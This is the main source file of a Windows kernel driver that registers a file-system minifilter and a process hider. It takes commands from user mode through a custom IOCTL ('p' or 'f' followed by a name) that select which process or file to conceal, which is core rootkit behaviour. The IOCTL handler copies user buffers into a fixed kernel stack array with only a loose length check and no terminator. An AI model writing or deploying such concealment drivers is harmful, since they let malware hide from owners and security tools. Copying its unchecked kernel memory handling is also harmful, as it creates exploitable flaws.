#include "Hide.h"

NTSTATUS DriverEntry(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path)
{
    NTSTATUS status = STATUS_SUCCESS;

    // ExInitializeDriverRuntime(DrvRtPoolNxOptIn);

    UNREFERENCED_PARAMETER(registry_path);
    DebugMessage("PFMinifilter!DriverEntry: Entered\n");

    driver_object->DriverUnload = (PDRIVER_UNLOAD)DriverUnload;

    //
    //  Register with FltMgr to tell it our callback routines
    //
    filter::FileFilter::SetDriverObjectPtr(driver_object);
    status = filter::FileFilter::Register();

    if (!NT_SUCCESS(status))
    {
        DebugMessage("FileFilter: Register not successfull\n");
        return STATUS_UNSUCCESSFUL;
    }

    driver_object->MajorFunction[IRP_MJ_DEVICE_CONTROL] = HandleCustomIOCTL;

    // routines that will execute once a handle to our device's symbolik link is opened/closed
    driver_object->MajorFunction[IRP_MJ_CREATE] = MajorFunctions;
    driver_object->MajorFunction[IRP_MJ_CLOSE] = MajorFunctions;

    status = IoCreateDevice(driver_object, 0, &DEVICE_NAME, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &driver_object->DeviceObject);

    if (!NT_SUCCESS(status))
    {
        DebugMessage("Could not create device %wZ", DEVICE_NAME);
    }
    else
    {
        DebugMessage("Device %wZ created", DEVICE_NAME);
    }

    status = IoCreateSymbolicLink(&DEVICE_SYMBOLIC_NAME, &DEVICE_NAME);
    if (NT_SUCCESS(status))
    {
        DebugMessage("Symbolic link %wZ created", DEVICE_SYMBOLIC_NAME);
    }
    else
    {
        DebugMessage("Error creating symbolic link %wZ", DEVICE_SYMBOLIC_NAME);
    }

    status = filter::ProcessHider::Register();

    if (!NT_SUCCESS(status))
    {
        DebugMessage("ProcessFilter: Register not successfull\n");
        return STATUS_UNSUCCESSFUL;
    }

    return STATUS_SUCCESS;

}

NTSTATUS FilterUnload(FLT_FILTER_UNLOAD_FLAGS flags)
{
    UNREFERENCED_PARAMETER(flags);
    DebugMessage("FileFilter: Unload\n");

    // File Filter Unload must always at the last of the Unload rountine
    filter::FileFilter::Unload();

    return STATUS_SUCCESS;
}

NTSTATUS DriverUnload(PDRIVER_OBJECT driver_object)
{
    UNREFERENCED_PARAMETER(driver_object);
    DebugMessage("DriverUnload: Unload\n");

    IoDeleteDevice(driver_object->DeviceObject);
    IoDeleteSymbolicLink(&DEVICE_SYMBOLIC_NAME);

    filter::ProcessHider::Unload();

    return STATUS_SUCCESS;
}

NTSTATUS HandleCustomIOCTL(PDEVICE_OBJECT device_object, PIRP irp)
{
    UNREFERENCED_PARAMETER(device_object);

    WCHAR cmd[MAX_SIZE];
    long long msg_sz;
    PIO_STACK_LOCATION stackLocation = NULL;

    stackLocation = IoGetCurrentIrpStackLocation(irp);

    if (stackLocation->Parameters.DeviceIoControl.IoControlCode == IOCTL_HIEU)
    {
        // handle message here
        DebugMessage("Input received from userland: %s", (char*)irp->AssociatedIrp.SystemBuffer);
        msg_sz = wcslen((WCHAR*)irp->AssociatedIrp.SystemBuffer);
        if (msg_sz <= MAX_SIZE)
        {
            RtlCopyMemory(cmd, (WCHAR*)irp->AssociatedIrp.SystemBuffer, msg_sz * sizeof(WCHAR));
            if (cmd[1] == L' ')
            {
                switch (cmd[0])
                {
                case L'p':
                    KeAcquireGuardedMutex(&filter::ProcessHider::process_name_lock_);
                    RtlCopyMemory(&filter::ProcessHider::process_to_hide_, (PWCHAR)((PUCHAR)irp->AssociatedIrp.SystemBuffer + 4), (msg_sz - 2) * sizeof(WCHAR));
                    DebugMessage("Hide process %S", filter::ProcessHider::process_to_hide_);
                    KeReleaseGuardedMutex(&filter::ProcessHider::process_name_lock_);
                    break;
                case L'f':
                    KeAcquireGuardedMutex(&filter::FileFilter::file_name_lock_);
                    RtlCopyMemory(&filter::FileFilter::file_to_hide_, (PWCHAR)((PUCHAR)irp->AssociatedIrp.SystemBuffer + 4), (msg_sz - 2) * sizeof(WCHAR));
                    DebugMessage("Hide file %S", filter::FileFilter::file_to_hide_);
                    KeReleaseGuardedMutex(&filter::FileFilter::file_name_lock_);
                    break;
                default:
                    break;
                }
            }

        }
    }


    IoCompleteRequest(irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;

}

NTSTATUS MajorFunctions(PDEVICE_OBJECT device_object, PIRP irp)
{
    UNREFERENCED_PARAMETER(device_object);

    PIO_STACK_LOCATION stackLocation = NULL;
    stackLocation = IoGetCurrentIrpStackLocation(irp);

    switch (stackLocation->MajorFunction)
    {
    case IRP_MJ_CREATE:
        DebugMessage("Handle to symbolink link %wZ opened", DEVICE_SYMBOLIC_NAME);
        break;
    case IRP_MJ_CLOSE:
        DebugMessage("Handle to symbolink link %wZ closed", DEVICE_SYMBOLIC_NAME);
        break;
    default:
        break;
    }

    irp->IoStatus.Information = 0;
    irp->IoStatus.Status = STATUS_SUCCESS;
    IoCompleteRequest(irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;

}
